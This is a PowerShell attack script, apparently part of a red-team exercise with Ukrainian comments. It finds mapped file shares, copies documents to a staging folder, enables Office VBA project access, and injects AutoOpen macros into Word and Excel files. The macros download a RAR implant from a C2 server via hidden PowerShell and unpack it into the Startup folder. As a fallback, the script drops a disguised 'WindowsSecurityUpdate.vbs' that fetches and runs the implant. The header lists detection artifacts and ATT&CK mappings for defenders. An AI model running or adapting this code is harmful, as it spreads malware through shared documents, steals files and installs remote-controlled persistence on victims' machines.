# =============================================================================
#  Block 7: File Server Macro Injection
#  для навчання — заборонено використовувати поза навчальним середовищем
#  EXERCISE ONLY — Blue Team Training
# =============================================================================
# Що робить:
#   1. Знаходить mapped shares через net use + registry
#   2. Перевіряє чи шара вже оброблялася (.winsec маркер)
#   3. Знаходить .docx/.xlsx файли в шарі
#   4. Інжектує VBA macro AutoOpen/Auto_Open → завантажує implant.zip з C2
#   5. Зберігає macro-enabled версії (.docm/.xlsm) поруч з оригіналами
#   6. Залишає маркер .winsec в шарі
#
# Артефакти для blue team:
#   - Sysmon EID 1  : winword.exe / excel.exe з незвичайним parent (powershell)
#   - Sysmon EID 11 : нові .docm/.xlsm файли в мережевій шарі
#   - Sysmon EID 3  : TCP з'єднання до C2 HTTP (port 80)
#   - Sysmon EID 1  : cmd.exe → powershell.exe запущений з Office
#
# MITRE ATT&CK:
#   T1137     — Office Application Startup (Macro)
#   T1105     — Ingress Tool Transfer
#   T1566.001 — Spearphishing Attachment
#   T1021.002 — SMB/Windows Admin Shares
# =============================================================================

$BLOCK_TAG = "B7"
$LogPath   = "C:\ProgramData\upd_logs\block7.log"
. "$PSScriptRoot\config.ps1"

$C2_HTTP      = "http://$C2_DOMAIN"           # HTTP сервер — той самий домен що і DNS C2
$IMPLANT_URL  = "$C2_HTTP/implant_drop.rar"   # RAR з implant.ps1 → потрапляє в Startup
$SCAN_MARKER  = ".winsec"                     # маркер що шара вже оброблена

# ── Зібрати файли з FILES-01 → docs\ (A08) ───────────────────────────────────

function Collect-FilesFromShare {
    param([string]$SharePath)

    $docs_dir = "C:\ProgramData\upd_logs\docs"
    if (-not (Test-Path $docs_dir)) {
        New-Item -Path $docs_dir -ItemType Directory -Force | Out-Null
    }

    $extensions = @("*.docx","*.xlsx","*.pdf")
    $collected  = 0

    foreach ($ext in $extensions) {
        Get-ChildItem -Path $SharePath -Filter $ext -Recurse -ErrorAction Ignore | ForEach-Object {
            Copy-Item -Path $_.FullName -Destination $docs_dir -Force -ErrorAction Ignore
            $collected++
            Write-Log "File from share [$SharePath]: $($_.Name)"
        }
    }

    Write-Log "Files collected from share: $collected"
    Invoke-DnsBeacon -Label "B7:COLLECT:$collected"
    return $collected
}

# ── Знайти mapped shares ──────────────────────────────────────────────────────

function Get-MappedShares {
    $shares = [System.Collections.Generic.List[hashtable]]::new()

    # Метод 1: net use — обробляємо і OK і Disconnected
    net use 2>&1 | ForEach-Object {
        if ($_ -match '(OK|Disconnected)\s+([A-Z]:)?\s*(\\\\[^\s]+)') {
            $status = $Matches[1]
            $drive  = $Matches[2]   # напр. "Z:"
            $unc    = $Matches[3]   # напр. "\\10.10.10.30\Finance"

            # Disconnected — пробуємо перепідключити через літеру диска
            if ($status -eq 'Disconnected' -and $drive) {
                Write-Log "Share Disconnected: $drive ($unc) — reconnecting..."
                net use $drive 2>$null | Out-Null
            }

            # Використовуємо літеру диска якщо доступна, інакше UNC
            $path = if ($drive -and (Test-Path "${drive}\")) { $drive } else { $unc }

            if (($shares | Where-Object { $_.Path -eq $path -or $_.Path -eq $unc }).Count -eq 0) {
                $shares.Add(@{ Path = $path; Source = "net_use" })
                Write-Log "Share (net use [$status]): $path"
            }
        }
    }

    # Метод 2: Registry HKCU:\Network (mapped drives)
    if (Test-Path "HKCU:\Network") {
        Get-ChildItem "HKCU:\Network" -ErrorAction SilentlyContinue | ForEach-Object {
            $remote = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).RemotePath
            if ($remote -and ($shares | Where-Object { $_.Path -eq $remote }).Count -eq 0) {
                $shares.Add(@{ Path = $remote; Source = "registry" })
                Write-Log "Share (registry): $remote"
            }
        }
    }

    return $shares
}

# ── Перевірити Office VBOM доступ (потрібно для COM macro injection) ──────────

function Enable-OfficeMacroAccess {
    # Trust access to VBA project object model
    Get-ChildItem "HKCU:\Software\Microsoft\Office" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $ver = $_.PSChildName
            foreach ($app in @("Word", "Excel")) {
                $path = "HKCU:\Software\Microsoft\Office\$ver\$app\Security"
                if (Test-Path $path) {
                    Set-ItemProperty -Path $path -Name "AccessVBOM" -Value 1 -Force -ErrorAction SilentlyContinue
                }
            }
        }
}

# ── VBA macro код ─────────────────────────────────────────────────────────────

function Get-MacroCode {
    param([string]$SubName = "AutoOpen")

    return @"
Sub $SubName()
    On Error Resume Next

    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")

    ' Перевірити чи implant.ps1 вже є в Startup (з архіву)
    Dim startup As String
    startup = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\"

    If fso.FileExists(startup & "implant.ps1") Then
        Set fso = Nothing
        Set sh = Nothing
        Exit Sub
    End If

    ' implant.ps1 не знайдено - завантажуємо
    Dim url As String
    Dim rar_path As String
    url      = "$IMPLANT_URL"
    rar_path = Environ("TEMP") & "\implant_drop.rar"

    sh.Run "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command " & _
           Chr(34) & "iwr '" & url & "' -OutFile '" & rar_path & "' -UseBasicParsing -TimeoutSec 30" & Chr(34), 0, True

    ' Знайти WinRAR
    Dim winrar As String
    winrar = ""
    If Dir("C:\Program Files\WinRAR\WinRAR.exe") <> "" Then
        winrar = """C:\Program Files\WinRAR\WinRAR.exe"""
    ElseIf Dir("C:\Program Files (x86)\WinRAR\WinRAR.exe") <> "" Then
        winrar = """C:\Program Files (x86)\WinRAR\WinRAR.exe"""
    End If

    If winrar = "" Or Not fso.FileExists(rar_path) Then
        Set fso = Nothing
        Set sh = Nothing
        Exit Sub
    End If

    ' Розпакувати у Startup
    sh.Run winrar & " x -ibck -o+ -inul """ & rar_path & """ """ & startup & """", 0, True

    ' Прибрати архів
    sh.Run "cmd /c del /f /q """ & rar_path & """", 0, False

    Set fso = Nothing
    Set sh = Nothing
End Sub
"@
}

# ── Inject macro у Word document (.docx → .docm) ─────────────────────────────

function Inject-WordMacro {
    param([string]$FilePath)

    try {
        $word = New-Object -ComObject Word.Application -ErrorAction Stop
        $word.Visible = $false
        $word.DisplayAlerts = 0

        $doc = $word.Documents.Open($FilePath)

        $vbComp = $doc.VBProject.VBComponents.Add(1)  # vbext_ct_StdModule
        $vbComp.Name = "WinSecUpdate"
        $vbComp.CodeModule.AddFromString((Get-MacroCode -SubName "AutoOpen"))

        $new_path = $FilePath -replace '\.docx$', '.docm'
        $doc.SaveAs2($new_path, 13)   # wdFormatXMLDocumentMacroEnabled
        $doc.Close($false)
        $word.Quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null

        Write-Log "Word macro injected: $new_path"
        return $new_path
    } catch {
        Write-Log "Word injection failed [$FilePath]: $_" -Level "WARN"
        return $null
    }
}

# ── Inject macro у Excel workbook (.xlsx → .xlsm) ────────────────────────────

function Inject-ExcelMacro {
    param([string]$FilePath)

    try {
        $excel = New-Object -ComObject Excel.Application -ErrorAction Stop
        $excel.Visible = $false
        $excel.DisplayAlerts = $false

        $wb = $excel.Workbooks.Open($FilePath)

        $vbComp = $wb.VBProject.VBComponents.Add(1)
        $vbComp.Name = "WinSecUpdate"
        $vbComp.CodeModule.AddFromString((Get-MacroCode -SubName "Auto_Open"))

        $new_path = $FilePath -replace '\.xlsx$', '.xlsm'
        $wb.SaveAs($new_path, 52)   # xlOpenXMLWorkbookMacroEnabled
        $wb.Close($false)
        $excel.Quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($excel) | Out-Null

        Write-Log "Excel macro injected: $new_path"
        return $new_path
    } catch {
        Write-Log "Excel injection failed [$FilePath]: $_" -Level "WARN"
        return $null
    }
}

# =============================================================================
# MAIN
# =============================================================================

Write-Log "=== BLOCK 7: FILE SERVER MACRO INJECTION START ==="
Invoke-DnsBeacon -Label "B7:START:$env:COMPUTERNAME"

# ── Знайти shares ─────────────────────────────────────────────────────────────

$shares = Get-MappedShares
if ($shares.Count -eq 0) {
    Write-Log "Mapped shares not found — спробуй підключитися вручну або перевір net use" -Level "WARN"
    Invoke-DnsBeacon -Label "B7:ERROR:NO_SHARES"
    Write-Log "=== BLOCK 7: COMPLETE (no shares) ==="
    exit
}

Write-Log "Found $($shares.Count) share(s)"
Invoke-DnsBeacon -Label "B7:SHARES:$($shares.Count)"

# ── Дозволяємо COM macro injection ───────────────────────────────────────────
Enable-OfficeMacroAccess

$total_injected = 0

foreach ($share in $shares) {
    $share_path = $share.Path
    Write-Log "--- Processing share: $share_path ---"

    # ── Перевірка маркера ─────────────────────────────────────────────────────
    $marker_path = "$share_path\$SCAN_MARKER"
    if (Test-Path $marker_path) {
        Write-Log "Share вже оброблена ($marker_path) — пропускаємо"
        Invoke-DnsBeacon -Label "B7:SHARE:ALREADY_DONE"
        continue
    }

    if (-not (Test-Path $share_path)) {
        Write-Log "Share недоступна: $share_path" -Level "WARN"
        continue
    }

    # ── Зібрати всі файли з шари → docs\ (A08: FILES-01 primary collection) ──
    Collect-FilesFromShare -SharePath $share_path | Out-Null

    # ── Знайти документи для macro injection ─────────────────────────────────
    $docs  = Get-ChildItem $share_path -Filter "*.docx" -ErrorAction SilentlyContinue
    $xlsxs = Get-ChildItem $share_path -Filter "*.xlsx" -ErrorAction SilentlyContinue

    Write-Log "Found: $($docs.Count) .docx, $($xlsxs.Count) .xlsx"
    Invoke-DnsBeacon -Label "B7:DOCS:$($docs.Count + $xlsxs.Count)"

    $injected = 0

    # ── Inject у Word ─────────────────────────────────────────────────────────
    foreach ($doc in $docs) {
        $result = Inject-WordMacro -FilePath $doc.FullName
        if ($result) { $injected++ }
    }

    # ── Inject у Excel ────────────────────────────────────────────────────────
    foreach ($xlsx in $xlsxs) {
        $result = Inject-ExcelMacro -FilePath $xlsx.FullName
        if ($result) { $injected++ }
    }

    Write-Log "Injected: $injected files in $share_path"
    Invoke-DnsBeacon -Label "B7:INJECTED:$injected"

    # ── Fallback: якщо Office нема — кладемо VBS у шару ──────────────────────
    if ($injected -eq 0) {
        Write-Log "COM injection не вдався — fallback: drop VBS script" -Level "WARN"

        $vbs_path = "$share_path\WindowsSecurityUpdate.vbs"
        $vbs_content = @"
On Error Resume Next
Dim sh : Set sh = CreateObject("WScript.Shell")
Dim url, rar_path, out_dir
url      = "$IMPLANT_URL"
rar_path = sh.ExpandEnvironmentStrings("%TEMP%") & "\implant_drop.rar"
out_dir  = sh.ExpandEnvironmentStrings("%TEMP%") & "\implant_drop\"
sh.Run "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command " & _
       Chr(34) & "iwr '" & url & "' -OutFile '" & rar_path & "' -UseBasicParsing -TimeoutSec 30" & Chr(34), 0, True
Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim winrar : winrar = ""
If fso.FileExists("C:\Program Files\WinRAR\WinRAR.exe") Then
    winrar = """C:\Program Files\WinRAR\WinRAR.exe"""
ElseIf fso.FileExists("C:\Program Files (x86)\WinRAR\WinRAR.exe") Then
    winrar = """C:\Program Files (x86)\WinRAR\WinRAR.exe"""
End If
If winrar = "" Or Not fso.FileExists(rar_path) Then WScript.Quit 1
sh.Run winrar & " x -ibck -o+ -inul """ & rar_path & """ """ & out_dir & """", 0, True
Dim implant : implant = out_dir & "implant.ps1"
If fso.FileExists(implant) Then
    sh.Run "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File """ & implant & """", 0, False
End If
sh.Run "cmd /c del /f /q """ & rar_path & """", 0, False
Set fso = Nothing : Set sh = Nothing
"@
        $vbs_content | Out-File -FilePath $vbs_path -Encoding ASCII -Force

        if (Test-Path $vbs_path) {
            Write-Log "VBS fallback dropped: $vbs_path"
            Invoke-DnsBeacon -Label "B7:FALLBACK:VBS_DROPPED"
            $injected = 1
        } else {
            Write-Log "VBS fallback failed — share може бути read-only" -Level "WARN"
            Invoke-DnsBeacon -Label "B7:FALLBACK:FAILED"
        }
    }

    # ── Залишаємо маркер ──────────────────────────────────────────────────────
    "$env:COMPUTERNAME | $(Get-Date) | injected=$injected" |
        Out-File -FilePath $marker_path -Encoding UTF8 -Force
    Write-Log "Marker left: $marker_path"

    $total_injected += $injected
}

Write-Log "=== BLOCK 7: COMPLETE === total injected: $total_injected"
Invoke-DnsBeacon -Label "B7:DONE:INJECTED:$total_injected"
